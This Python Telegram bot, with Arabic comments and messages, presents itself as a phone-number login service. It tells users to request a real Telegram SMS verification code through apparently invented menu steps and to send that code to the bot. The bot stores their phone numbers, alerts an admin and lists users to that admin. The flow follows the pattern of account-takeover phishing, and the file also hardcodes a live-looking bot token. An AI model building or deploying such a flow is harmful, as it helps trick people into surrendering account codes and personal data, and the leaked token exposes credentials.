import logging
import sqlite3
import asyncio
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

# تكوين السجل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# مراحل المحادثة
WAITING_PHONE, WAITING_CODE, CONFIRM_LOGIN = range(3)

# إنشاء قاعدة البيانات
def init_db():
    conn = sqlite3.connect('telegram_users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  phone_number TEXT,
                  first_name TEXT,
                  last_name TEXT,
                  username TEXT,
                  session_data TEXT,
                  last_login DATETIME,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS login_attempts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  phone_number TEXT,
                  auth_code TEXT,
                  expires_at DATETIME,
                  status TEXT DEFAULT 'pending',
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()

# توليد رقم تحقق (محاكاة لكود تلجرام)
def generate_auth_code():
    import random
    # كود 5 أرقام مثل كود تلجرام
    return str(random.randint(10000, 99999))

# الحصول على معلومات المستخدم من قاعدة البيانات
def get_user_by_phone(phone):
    conn = sqlite3.connect('telegram_users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE phone_number=?", (phone,))
    user = c.fetchone()
    conn.close()
    return user

# حفظ محاولة تسجيل الدخول
def save_login_attempt(phone, auth_code):
    conn = sqlite3.connect('telegram_users.db')
    c = conn.cursor()
    
    expires_at = datetime.now() + timedelta(minutes=5)  # صلاحية 5 دقائق
    
    c.execute('''INSERT INTO login_attempts 
                 (phone_number, auth_code, expires_at) 
                 VALUES (?, ?, ?)''',
              (phone, auth_code, expires_at))
    
    conn.commit()
    login_id = c.lastrowid
    conn.close()
    
    return login_id

# التحقق من صحة الكود
def verify_auth_code(phone, code):
    conn = sqlite3.connect('telegram_users.db')
    c = conn.cursor()
    
    now = datetime.now()
    
    c.execute('''SELECT * FROM login_attempts 
                 WHERE phone_number=? AND auth_code=? 
                 AND status='pending' AND expires_at > ?''',
              (phone, code, now))
    
    attempt = c.fetchone()
    
    if attempt:
        # تحديث الحالة
        c.execute('''UPDATE login_attempts 
                     SET status='verified' 
                     WHERE id=?''', (attempt[0],))
        conn.commit()
        conn.close()
        return True
    
    conn.close()
    return False

# تحديث معلومات المستخدم بعد تسجيل الدخول الناجح
def update_user_session(user_id, phone, user_info):
    conn = sqlite3.connect('telegram_users.db')
    c = conn.cursor()
    
    # تحقق إذا كان المستخدم موجود
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    existing_user = c.fetchone()
    
    session_data = f"session_{user_id}_{datetime.now().timestamp()}"
    
    if existing_user:
        # تحديث البيانات
        c.execute('''UPDATE users 
                     SET phone_number=?, 
                         first_name=?, 
                         last_name=?, 
                         username=?, 
                         session_data=?, 
                         last_login=CURRENT_TIMESTAMP 
                     WHERE user_id=?''',
                  (phone, 
                   user_info.get('first_name', ''),
                   user_info.get('last_name', ''),
                   user_info.get('username', ''),
                   session_data,
                   user_id))
    else:
        # إضافة مستخدم جديد
        c.execute('''INSERT INTO users 
                     (user_id, phone_number, first_name, last_name, username, session_data, last_login) 
                     VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)''',
                  (user_id,
                   phone,
                   user_info.get('first_name', ''),
                   user_info.get('last_name', ''),
                   user_info.get('username', ''),
                   session_data))
    
    conn.commit()
    conn.close()
    return session_data

# أمر /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    keyboard = [
        [InlineKeyboardButton("📱 تسجيل الدخول برقم الهاتف", callback_data="login_with_phone")],
        [InlineKeyboardButton("ℹ️ المساعدة", callback_data="help")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"مرحباً {user.first_name}! 👋\n\n"
        "**بوت تسجيل الدخول عبر تلجرام**\n\n"
        "لبدء تسجيل الدخول، اضغط على الزر أدناه لمشاركة رقم هاتفك.",
        reply_markup=reply_markup
    )
    
    return ConversationHandler.END

# معالجة زر تسجيل الدخول
async def login_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "login_with_phone":
        await query.edit_message_text(
            "**تسجيل الدخول برقم الهاتف**\n\n"
            "⬇️ **الخطوات المطلوبة:**\n"
            "1. افتح تطبيق **Telegram الرسمي**\n"
            "2. اذهب إلى **الإعدادات → الخصوصية والأمان**\n"
            "3. اختر **جلسات نشطة** أو **تسجيل الدخول على ويب**\n"
            "4. اطلب **كود التحقق** ليتم إرساله إلى رقمك\n"
            "5. احصل على الكود المكون من **5 أرقام**\n\n"
            "أرسل لي رقم هاتفك الآن بالصيغة الدولية:\n"
            "مثال: +966501234567"
        )
        return WAITING_PHONE
    elif query.data == "help":
        await query.edit_message_text(
            "**مساعدة تسجيل الدخول**\n\n"
            "🔹 **طريقة الحصول على كود تلجرام:**\n"
            "1. افتح تطبيق Telegram\n"
            "2. اذهب إلى Settings\n"
            "3. Privacy and Security\n"
            "4. Active Sessions / Web Login\n"
            "5. Request verification code\n\n"
            "🔹 **معلومات مهمة:**\n"
            "• الكود سيكون 5 أرقام\n"
            "• صلاحية الكود 5 دقائق\n"
            "• الكود يصل عبر رسالة SMS\n\n"
            "لبدء التسجيل، اضغط /start"
        )
        return ConversationHandler.END

# استقبال رقم الهاتف
async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone_number = update.message.text.strip()
    
    # التحقق من صيغة الرقم
    if not (phone_number.startswith('+') and phone_number[1:].isdigit() and len(phone_number) > 8):
        await update.message.reply_text(
            "❌ **رقم غير صالح!**\n"
            "الرجاء إرسال الرقم بالصيغة الدولية الصحيحة:\n"
            "مثال: +966501234567"
        )
        return WAITING_PHONE
    
    # حفظ رقم الهاتف في بيانات المحادثة
    context.user_data['phone'] = phone_number
    
    # توليد كود تحقق محاكاة
    auth_code = generate_auth_code()
    
    # حفظ محاولة الدخول
    login_id = save_login_attempt(phone_number, auth_code)
    context.user_data['login_id'] = login_id
    context.user_data['auth_code'] = auth_code
    
    # إرسال التعليمات
    await update.message.reply_text(
        f"✅ **تم استلام رقمك: {phone_number}**\n\n"
        f"⬇️ **الآن اتبع هذه الخطوات في تطبيق Telegram:**\n\n"
        "1. افتح **تطبيق Telegram الرسمي**\n"
        "2. اذهب إلى **Settings → Privacy and Security**\n"
        "3. اختر **Active Sessions**\n"
        "4. اضغط على **Log in by phone number**\n"
        "5. أدخل رقمك: `{phone_number}`\n"
        "6. ستصلك رسالة **SMS بكود تحقق**\n"
        "7. الكود سيكون **5 أرقام**\n\n"
        "**(للتجربة، يمكنك استخدام هذا الكود: `{auth_code}`)**\n\n"
        "➡️ **أرسل لي الكود الذي وصلتك من Telegram:**"
    )
    
    return WAITING_CODE

# استقبال كود التحقق
async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    phone_number = context.user_data.get('phone')
    
    if not phone_number:
        await update.message.reply_text("❌ حدث خطأ. الرجاء البدء من جديد باستخدام /start")
        return ConversationHandler.END
    
    # التحقق من صحة الكود
    if verify_auth_code(phone_number, code):
        # تسجيل الدخول الناجح
        user = update.effective_user
        user_info = {
            'first_name': user.first_name,
            'last_name': user.last_name,
            'username': user.username
        }
        
        # تحديث بيانات المستخدم
        session_data = update_user_session(user.id, phone_number, user_info)
        context.user_data['session'] = session_data
        
        # إرسال رسالة النجاح
        keyboard = [
            [InlineKeyboardButton("📊 حسابي", callback_data="my_account")],
            [InlineKeyboardButton("🔒 الجلسة النشطة", callback_data="show_session")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"🎉 **تم تسجيل الدخول بنجاح!**\n\n"
            f"👤 **المستخدم:** {user.first_name}\n"
            f"📞 **الرقم:** {phone_number}\n"
            f"🆔 **المعرف:** {user.id}\n"
            f"🔑 **الجلسة:** `{session_data}`\n"
            f"⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            "✅ يمكنك الآن استخدام البوت بشكل كامل.",
            reply_markup=reply_markup
        )
        
        # إشعار المطور
        try:
            admin_id = context.bot_data.get('admin_id')
            if admin_id:
                await context.bot.send_message(
                    admin_id,
                    f"🔔 **تسجيل دخول جديد**\n\n"
                    f"👤 مستخدم: {user.first_name}\n"
                    f"📞 رقم: {phone_number}\n"
                    f"🆔 معرف: {user.id}\n"
                    f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}"
                )
        except:
            pass
        
        return ConversationHandler.END
    else:
        # محاولة فاشلة
        attempts = context.user_data.get('failed_attempts', 0) + 1
        context.user_data['failed_attempts'] = attempts
        
        if attempts >= 3:
            await update.message.reply_text(
                "❌ **تم تجاوز عدد المحاولات المسموحة!**\n"
                "الرجاء البدء من جديد باستخدام /start"
            )
            return ConversationHandler.END
        
        await update.message.reply_text(
            f"❌ **كود التحقق غير صحيح!**\n"
            f"المحاولة: {attempts}/3\n\n"
            "تأكد من:\n"
            "1. أن الكود مكون من 5 أرقام\n"
            "2. أن الكود لم ينته صلاحيته (5 دقائق)\n"
            "3. أنك أدخلت الكود الصحيح\n\n"
            "أعد إرسال الكود:"
        )
        return WAITING_CODE

# عرض حساب المستخدم
async def show_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    conn = sqlite3.connect('telegram_users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = c.fetchone()
    conn.close()
    
    if user:
        await query.edit_message_text(
            f"📊 **حسابك**\n\n"
            f"🆔 **المعرف:** {user[0]}\n"
            f"📞 **الرقم:** {user[1]}\n"
            f"👤 **الاسم:** {user[2]} {user[3]}\n"
            f"📛 **المستخدم:** @{user[4] or 'لا يوجد'}\n"
            f"🔑 **الجلسة:** `{user[5]}`\n"
            f"⏰ **آخر دخول:** {user[6]}\n"
            f"📅 **تاريخ التسجيل:** {user[7]}"
        )
    else:
        await query.edit_message_text(
            "❌ **لا يوجد حساب مسجل!**\n"
            "الرجاء تسجيل الدخول أولاً باستخدام /start"
        )

# عرض الجلسة
async def show_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    conn = sqlite3.connect('telegram_users.db')
    c = conn.cursor()
    c.execute("SELECT session_data FROM users WHERE user_id=?", (user_id,))
    session = c.fetchone()
    conn.close()
    
    if session and session[0]:
        await query.edit_message_text(
            f"🔐 **جلستك النشطة:**\n\n"
            f"`{session[0]}`\n\n"
            "**ملاحظة:**\n"
            "• هذه الجلسة تستخدم للتحقق من هويتك\n"
            "• لا تشاركها مع أي شخص"
        )
    else:
        await query.edit_message_text(
            "❌ **لا توجد جلسة نشطة!**\n"
            "الرجاء تسجيل الدخول أولاً"
        )

# أمر لرؤية المستخدمين (للمطور)
async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # ضع معرفك هنا (يجب تغييره)
    ADMIN_IDS = [7693421186]  # استبدل بمعرفك
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ ليس لديك صلاحية لهذا الأمر.")
        return
    
    conn = sqlite3.connect('telegram_users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users ORDER BY last_login DESC LIMIT 50")
    users = c.fetchall()
    conn.close()
    
    if not users:
        await update.message.reply_text("📭 لا يوجد مستخدمين مسجلين.")
        return
    
    message = "📋 **آخر 50 مستخدم:**\n\n"
    for user in users:
        message += f"👤 {user[2]} | 📞 {user[1]} | 🆔 {user[0]}\n"
        message += f"   ⏰ {user[6]} | 🔑 {user[5][:20]}...\n"
        message += "─" * 30 + "\n"
    
    await update.message.reply_text(message[:4000])

# أمر الإلغاء
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❌ **تم إلغاء عملية التسجيل.**\n"
        "يمكنك البدء من جديد باستخدام /start"
    )
    return ConversationHandler.END

# الدالة الرئيسية
def main():
    # تهيئة قاعدة البيانات
    init_db()
    
    # 🔑 **ضع توكن البوت هنا**
    TOKEN = "8529847407:AAF8SH0yVDPq5JHZSB7FfYmVlluMWZZIQxs"  # استبدل بتوكن البوت الحقيقي
    
    # إنشاء التطبيق
    application = Application.builder().token(TOKEN).build()
    
    # معالج المحادثة الرئيسي
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            CallbackQueryHandler(login_button, pattern='^login_with_phone$')
        ],
        states={
            WAITING_PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)
            ],
            WAITING_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    # إضافة المعالجات
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(show_account, pattern='^my_account$'))
    application.add_handler(CallbackQueryHandler(show_session, pattern='^show_session$'))
    application.add_handler(CallbackQueryHandler(login_button, pattern='^help$'))
    application.add_handler(CommandHandler('admin', admin_users))
    
    # تشغيل البوت
    print("🤖 بوت تسجيل الدخول يعمل...")
    print("📱 ينتظر المستخدمين...")
    print("🔗 أرسل /start للبدء")
    
    application.run_polling()

if __name__ == '__main__':
    main()
